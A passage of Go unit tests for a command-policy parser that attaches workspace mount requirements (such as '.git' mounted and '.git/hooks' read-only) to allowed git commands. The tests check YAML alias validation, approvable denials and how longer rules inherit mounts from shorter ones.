	p := mustParse(t, "rules:\n  - command: git status\n    args: any\n    mounts: &git-mounts\n      .git: mounted\n      .git/hooks: read-only\n  - command: git fetch\n    args: any\n    mounts: *git-mounts\n")
	allowed, err := p.Check([]string{"git", "fetch"})
	if err != nil {
		t.Fatal(err)
	}
	want := []MountRequirement{
		{Path: ".git", Mode: MountMounted, Rule: "git fetch"},
		{Path: ".git/hooks", Mode: MountReadOnly, Rule: "git fetch"},
	}
	if !slices.Equal(allowed.Mounts, want) {
		t.Fatalf("got %v, want %v", allowed.Mounts, want)
	}
}

// TestNewMountsRejectsAnInvalidAlias checks that an alias is validated as
// the node it refers to: a bad entry of the anchored map is still refused
// and names the line of that entry (where the text to fix is), and an
// anchor that is not a map is refused at the line of the alias. The
// anchor sits outside any `mounts:` key, which Parse would validate first.
func TestNewMountsRejectsAnInvalidAlias(t *testing.T) {
	cases := map[string]struct{ doc, want string }{
		"unknown mode": {
			"anchor: &m\n  .git: rw\nuse: *m\n",
			`mounts: path ".git": mode must be mounted or read-only, not "rw" (line 2)`,
		},
		"absolute path": {
			"anchor: &m\n  /etc: read-only\nuse: *m\n",
			`mounts: path "/etc" must be relative to the workspace root (line 2)`,
		},
		"scalar anchor": {
			"anchor: &m mounted\nuse: *m\n",
			`mounts: not a mapping of workspace paths to modes (line 2)`,
		},
		"sequence anchor": {
			"anchor: &m\n  - .git\nuse: *m\n",
			`mounts: not a mapping of workspace paths to modes (line 3)`,
		},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			var doc yaml.Node
			if err := yaml.Unmarshal([]byte(tc.doc), &doc); err != nil {
				t.Fatal(err)
			}
			alias := doc.Content[0].Content[3] // the value of `use`
			if alias.Kind != yaml.AliasNode {
				t.Fatalf("test document: got node kind %v, want an alias", alias.Kind)
			}
			_, err := newMounts(*alias, "use")
			if err == nil || err.Error() != tc.want {
				t.Fatalf("got %v, want %q", err, tc.want)
			}
		})
	}
}

func TestDenialApprovedCarriesTheMountsOfTheMatchedRule(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: git push\n    flags:\n      allow: [-v]\n    mounts:\n      .git: mounted\n")
	_, err := p.Check([]string{"git", "push", "--force"})
	d, ok := ApprovableDenial(err)
	if !ok {
		t.Fatalf("got %v, want an approvable denial", err)
	}
	want := []MountRequirement{{Path: ".git", Mode: MountMounted, Rule: "git push"}}
	if !slices.Equal(d.Approved.Mounts, want) {
		t.Fatalf("got %v, want %v", d.Approved.Mounts, want)
	}
}

// A command the longer rule denies still carries the requirements of the
// shorter rules, in Approved, as the daemon checks them for it.
func TestDenialApprovedCarriesTheMountsOfShorterRulesToo(t *testing.T) {
	p := mustParse(t, "rules:\n"+
		"  - command: git\n    args: any\n    mounts:\n      .git: mounted\n"+
		"  - command: git push\n    flags:\n      allow: [-v]\n    mounts:\n      .git/hooks: read-only\n")
	_, err := p.Check([]string{"git", "push", "--force"})
	d, ok := ApprovableDenial(err)
	if !ok {
		t.Fatalf("got %v, want an approvable denial", err)
	}
	want := []MountRequirement{
		{Path: ".git", Mode: MountMounted, Rule: "git"},
		{Path: ".git/hooks", Mode: MountReadOnly, Rule: "git push"},
	}
	if !slices.Equal(d.Approved.Mounts, want) {
		t.Fatalf("got %v, want %v", d.Approved.Mounts, want)
	}
}

// A rule whose command does not start the argv contributes nothing: not a
// longer rule, not a sibling, not a rule that only shares a first word with
// a longer command.
func TestMountsOfARuleThatDoesNotStartTheArgvAreNotRequired(t *testing.T) {
	p := mustParse(t, "rules:\n"+
		"  - command: git\n    args: any\n    mounts:\n      .git: mounted\n"+
		"  - command: git push\n    args: any\n    mounts:\n      .git/hooks: read-only\n"+
		"  - command: git fetch\n    args: any\n    mounts:\n      .git/config: read-only\n"+
		"  - command: gitk\n    args: any\n    mounts:\n      other: mounted\n")
	allowed, err := p.Check([]string{"git", "fetch"})
	if err != nil {
		t.Fatal(err)
	}
	want := []MountRequirement{
		{Path: ".git", Mode: MountMounted, Rule: "git"},
		{Path: ".git/config", Mode: MountReadOnly, Rule: "git fetch"},
	}
	if !slices.Equal(allowed.Mounts, want) {
		t.Fatalf("got %v, want %v", allowed.Mounts, want)
	}
}

// Two rules that name the same path and mode each declare it: both
// requirements are kept, the shorter rule's first, so that either rule's
// failure can be told.
func TestTheSameMountOfTwoRulesIsRequiredOfEach(t *testing.T) {
	p := mustParse(t, "rules:\n"+
		"  - command: git commit\n    args: any\n    mounts:\n      .git: mounted\n"+
		"  - command: git\n    args: any\n    mounts:\n      .git: mounted\n")
	allowed, err := p.Check([]string{"git", "commit"})
	if err != nil {
		t.Fatal(err)
	}
	want := []MountRequirement{
		{Path: ".git", Mode: MountMounted, Rule: "git"},
		{Path: ".git", Mode: MountMounted, Rule: "git commit"},
	}
	if !slices.Equal(allowed.Mounts, want) {
		t.Fatalf("got %v, want %v", allowed.Mounts, want)
	}
}

func TestALongerRuleInheritsTheMountsOfShorterRules(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: git\n    args: any\n    mounts:\n      .git: mounted\n  - command: git push\n    args: any\n")
	allowed, err := p.Check([]string{"git", "push"})
	if err != nil {
		t.Fatal(err)
	}
	want := []MountRequirement{{Path: ".git", Mode: MountMounted, Rule: "git"}}
	if !slices.Equal(allowed.Mounts, want) {
		t.Fatalf("got %v, want %v", allowed.Mounts, want)
	}
}
